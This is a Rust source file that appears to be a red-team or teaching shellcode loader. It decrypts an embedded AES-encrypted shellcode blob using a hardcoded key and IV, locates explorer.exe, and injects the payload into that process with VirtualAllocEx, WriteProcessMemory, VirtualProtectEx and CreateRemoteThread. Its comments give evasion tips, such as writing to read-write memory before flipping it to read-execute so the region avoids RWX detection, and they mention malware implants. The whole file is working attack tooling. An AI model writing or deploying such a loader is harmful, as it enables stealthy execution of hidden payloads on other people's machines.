use aes::Aes128;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;

// Create an alias for the AES-128 CBC mode
type Aes128Cbc = Cbc<Aes128, Pkcs7>;

use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

// Function to decrypt shellcode using AES-128 CBC
fn decrypt_shellcode(encrypted_shellcode: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Aes128Cbc::new_from_slices(key, iv).unwrap();
    cipher.decrypt_vec(encrypted_shellcode).unwrap()
}

// Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
fn inject_remote(shellcode: &[u8], process_id: u32) {
    //need to specify unsafe to tell Rust we're okay with managing memory directly
    unsafe {
        // Get a handle on the target process in order to interact with it
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        println!("[+] Got target process handle: {:?}", process_handle);
        // Allocate RW (read-write) memory
        // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode like the following
        let allocated_memory = VirtualAllocEx(
            process_handle,           //process handle
            ptr::null_mut(),          // Address to start allocation from. Null means 'anywhere'
            shellcode.len(),          // Size of allocation
            MEM_COMMIT | MEM_RESERVE, // Allocate memory immediately
            PAGE_READWRITE,           // Memory protection flags
        );

        if allocated_memory.is_null() {
            panic!("Failed to allocate memory.");
        }

        println!(
            "[+] Allocated RX memory in remote process at address {:?}",
            allocated_memory
        );

        // Write the payload to the allocated bytes in the remote process
        let mut bytes_written = 0;
        WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode.as_ptr() as _, // Get the raw pointer to our shellcode buffer
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Wrote {} bytes to remote process memory", bytes_written);

        // Change the memory protection to RX (read-execute)
        let mut old_protect = 0;

        let mem_protect = VirtualProtectEx(
            process_handle,
            allocated_memory,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            panic!("Failed to change memory protection.");
        }

        // Create a thread at the start of the executable shellcode to run it!
        // We use the 'transmute' function to convert our pointer to a function pointer

        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(allocated_memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        println!("[+] Created remote thread!");

        // Wait for our thread to exit to prevent program from closing before the shellcode ends
        // This is especially relevant for long-running shellcode, such as malware implants
        WaitForSingleObject(thread_handle, INFINITE);

        // cleanup

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        // Free the allocated memory
        VirtualFreeEx(
            process_handle,
            allocated_memory,
            0, // Set dwSize to 0 to release the entire region allocated
            MEM_RELEASE,
        );

        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

// Our main function, required as an entrypoint in Rust
fn main() -> Result<(), Box<dyn std::error::Error>> {
    // AES key & IV
    let key = b"verysecretkey123";
    let iv = b"initialvector123";

    // Encrypted shellcode from the Python script
    let shellcode: &[u8] = &[ 0xb6, 0x84, 0x90, 0x99, 0x64, 0x3c, 0x77, 0xb, 0xad, 0xdf, 0xbc, 0xcd, 0xf0, 0x8e, 0x5a, 0xeb, 0xb5, 0x32, 0x2f, 0xa0, 0x22, 0x7d, 0xef, 0x3f, 0x61, 0x16, 0x12, 0x7f, 0xca, 0xe6, 0x4e, 0x62, 0x34, 0xd7, 0x80, 0xd0, 0xe6, 0x13, 0xce, 0xb6, 0xd3, 0x24, 0x19, 0xa0, 0x7f, 0x4, 0x80, 0xe8, 0x4a, 0xc, 0x53, 0xb9, 0x97, 0x67, 0x2e, 0x70, 0x7a, 0xb3, 0xc9, 0x2c, 0xa2, 0xfd, 0xf4, 0x22, 0xd6, 0x2a, 0x63, 0x5b, 0x42, 0x3c, 0xd5, 0xf6, 0x71, 0xdd, 0x3, 0x3f, 0x62, 0xac, 0x55, 0x6, 0x4a, 0x10, 0xeb, 0xe5, 0xd8, 0x4c, 0x7a, 0x76, 0x74, 0x56, 0x68, 0x2a, 0x92, 0xff, 0xa5, 0x3b, 0x91, 0xb7, 0x55, 0xd8, 0x5c, 0xa2, 0xe2, 0xd9, 0xd2, 0x42, 0x4f, 0x5a, 0x5b, 0xec, 0xd3, 0xa2, 0x78, 0x4f, 0x11, 0xe2, 0x53, 0x5e, 0x52, 0xf8, 0xb5, 0x24, 0x13, 0x37, 0x21, 0x41, 0xf0, 0x36, 0xd3, 0x0, 0xb9, 0x3a, 0xcd, 0xbf, 0xe5, 0x94, 0x5d, 0x36, 0xf5, 0x43, 0xcb, 0x56, 0xb0, 0x98, 0xe8, 0x31, 0x26, 0xdb, 0xed, 0xa3, 0x2c, 0x44, 0x1d, 0x81, 0x4b, 0xed, 0xb6, 0x28, 0x2c, 0x2c, 0x78, 0xbd, 0x75, 0x41, 0x54, 0xf3, 0xea, 0x2e, 0xe2, 0xc6, 0xe4, 0x81, 0xf5, 0xd4, 0x84, 0xa3, 0x80, 0xce, 0x7e, 0x9e, 0x8c, 0x64, 0xd9, 0xa4, 0x41, 0x1b, 0x3c, 0x2c, 0xf5, 0xaa, 0xb6, 0x9d, 0x20, 0x53, 0x3c, 0x7a, 0xae, 0xc4, 0x35, 0xb0, 0x33, 0x82, 0xf4, 0x1a, 0x14, 0x40, 0x94, 0x88, 0xc3, 0xb3, 0xb4, 0xa7, 0x78, 0x86, 0x16, 0xca, 0xe7, 0x3b, 0xbd, 0x35, 0x4c, 0x6f, 0xd4, 0xc3, 0x6f, 0x2b, 0xf6, 0xb1, 0x28, 0xbb, 0xc0, 0x66, 0xf, 0x98, 0xa3, 0x3b, 0x44, 0x1d, 0xd4, 0x1a, 0x35, 0x5c, 0x13, 0xd3, 0x9b, 0xbf, 0x82, 0x2f, 0x94, 0x3e, 0xfb, 0xb3, 0x52, 0xb6, 0x64, 0x65, 0x6d, 0x40, 0x84, 0xd0, 0x81, 0x60, 0x14, 0x51, 0x1d, 0x4d, 0x60, 0x6b, 0x8b, 0x1a, 0x8c, 0x30, 0x12, 0xd6, 0xa1, 0xb0, 0x2d, 0x45, 0x7c, 0x9, 0x9f, 0xd3, 0x59, 0x24, 0x2f, 0xbd, 0xff, 0x61 ];

    // Decrypt the shellcode in-place
    let decrypted_shellcode = decrypt_shellcode(shellcode, key, iv);

    // Print the decrypted shellcode
    println!("Decrypted shellcode: {:?}", decrypted_shellcode);

    // Find the "explorer.exe" process ID by its name using the 'sysinfo' crate
    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name("explorer")
        .next() // Get only the first result
        .unwrap() // Unwrap the result, panic if an error occurs
        .pid() // Get the process ID
        .as_u32(); // Convert the process ID to an unsigned, 32-bit integer
    println!("[+] Found explorer.exe with PID {}", process_id);

    inject_remote(&decrypted_shellcode, process_id);

    Ok(())
}